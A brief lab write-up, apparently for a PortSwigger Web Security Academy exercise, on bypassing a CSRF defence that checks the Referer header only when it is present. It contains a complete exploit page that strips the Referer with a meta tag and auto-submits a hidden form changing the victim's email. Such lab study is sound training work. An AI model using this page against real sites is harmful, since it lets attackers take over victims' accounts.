Lab #11: CSRF where Referer validation depends on header being present


Target:  changes the victim's email address

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address.

Analysis:


   There is a csrf vulnerability in change email and no csrf token is provided.

   CSRF prevention is through the referer http header. 
   so the attack script:

   <html>
        <head>
        <meta name="referrer" content="no-referrer">
        </head>                  
        <body>
                        <form action="https://myPOrtSwiggerID.web-security-academy.net/my-account/change-email" method="POST">
                            <input type="hidden" name="email" value="pwned1@evil-user.net" />
                        </form>
                        <script>
                            document.forms[0].submit();
                        </script>
        </body>
    </html>
